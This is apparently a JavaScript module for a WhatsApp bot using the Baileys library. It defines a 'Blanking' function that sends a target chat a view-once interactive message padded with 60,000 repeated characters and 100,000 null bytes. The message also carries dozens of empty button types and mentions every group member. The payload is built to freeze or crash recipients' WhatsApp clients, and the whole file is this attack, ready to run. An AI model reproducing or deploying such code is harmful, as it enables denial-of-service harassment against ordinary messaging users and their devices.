const {
	drayyyConnect,
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys")
const { drayyy, m } = require("./alphabot.js")
 const remoteJid = m.key.remoteJid
       const itil = String.fromCharCode(8206)
	   const readmore = itil.repeat(4001)
		const isGroup = m.chat.endsWith('@g.us');
		const groupMetadata = isGroup ? await drayyy.groupMetadata(m.chat).catch(e => {}) : '';
		const groupName = isGroup ? groupMetadata.subject : '';
		const groupMembers = isGroup ? groupMetadata.participants : '';
		const groupAdmins = isGroup ? await getGroupAdmins(groupMembers) : '';
		const isBotAdmin = isGroup ? groupAdmins.includes(botNumber + '@s.whatsapp.net') : false;
		const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
		const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
		const groupOwner = isGroup ? groupMetadata.owner : '';
		const prem = JSON.parse(fs.readFileSync('./penyimpanan/database/prem.json'))	

exports.Blanking = async (drayyy, target) => {
var member = await groupMetadata.participants.map(e => e.id)
let msg = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
mentionedJid: [...member],
isForwarded: true,
forwardingScore: 999,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363333973020520@newsletter",
newsletterName: "⿻々᤻̈́𝐙͢𝐞⃕𝐧̬𝐨⃨᪴𝐆𝐞᪵⃜𝐧𝐀᪶𝐥𝐩᪳᪼𝐡⃯𝐚᷍⭆̈́𝐒᷏𝟑̬〽⿻",
serverMessageId: 1
}
},
header: {
title: "",
...(await prepareWAMessageMedia({
image: {  
url: "https://files.catbox.moe/gpxahn.jpg",
gifPlayback: true
}
}, {
upload: drayyy.waUploadToServer,
mediaType: "image"
})),
hasMediaAttachment: true
},
body: { 
text: "⿻々᤻̈́𝐙͢𝐞⃕𝐧̬𝐨⃨᪴𝐆𝐞᪵⃜𝐧𝐀᪶𝐥𝐩᪳᪼𝐡⃯𝐚᷍⭆̈́𝐒᷏𝟑̬〽⿻",
mentions: [...member]
},
footer: { text: "Blanking In Place" },
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"ꦾ".repeat(60000)}","sections":[{"title":"Flow Button","rows":[]}]}`
},
{
name: "quick_reply",
buttonParamsJson: `{"display_text": "", "id": ""}`
},
{
name: "cta_url",
buttonParamsJson: `{"display_text": "", "url": "", "merchant_url": ""}`
},
{ name: "mpm", buttonParamsJson: "{}" },
{ name: "payment_method", buttonParamsJson: "{}" },
{ name: "call_permission_request", buttonParamsJson: "{}" },
{ name: "form_message", buttonParamsJson: "{}" },
{ name: "wa_payment_learn_more", buttonParamsJson: "{}" },
{ name: "wa_payment_transaction_details", buttonParamsJson: "{}" },
{ name: "wa_payment_fbpin_reset", buttonParamsJson: "{}" },
{ name: "catalog_message", buttonParamsJson: "{}" },
{ name: "payment_info", buttonParamsJson: "{}" },
{ name: "review_order", buttonParamsJson: "{}" },
{ name: "send_location", buttonParamsJson: "{}" },
{ name: "payments_care_csat", buttonParamsJson: "{}" },
{ name: "view_product", buttonParamsJson: "{}" },
{ name: "payment_settings", buttonParamsJson: "{}" },
{ name: "address_message", buttonParamsJson: "{}" },
{ name: "automated_greeting_message_view_catalog", buttonParamsJson: "{}" },
{ name: "open_webview", buttonParamsJson: "{}" },
{ name: "message_with_link_status", buttonParamsJson: "{}" },
{ name: "payment_status", buttonParamsJson: "{}" },
{ name: "extensions_message_v2", buttonParamsJson: "{}" },
{ name: "landline_call", buttonParamsJson: "{}" },
{ name: "review_and_pay", buttonParamsJson: "{}" },
{
name: "galaxy_message",
buttonParamsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "Null",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "tamaryuichix@gmail.com",
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "radio - buttons${"\0".repeat(100000)}",
"screen_0_TextInput_1": "Anjay",
"screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}`,
version: 3
}
]
}
}
}
}
}), { userJid: target, quoted: null });

await drayyy.relayMessage(target, msg.message, { messageId: msg.key.id });
}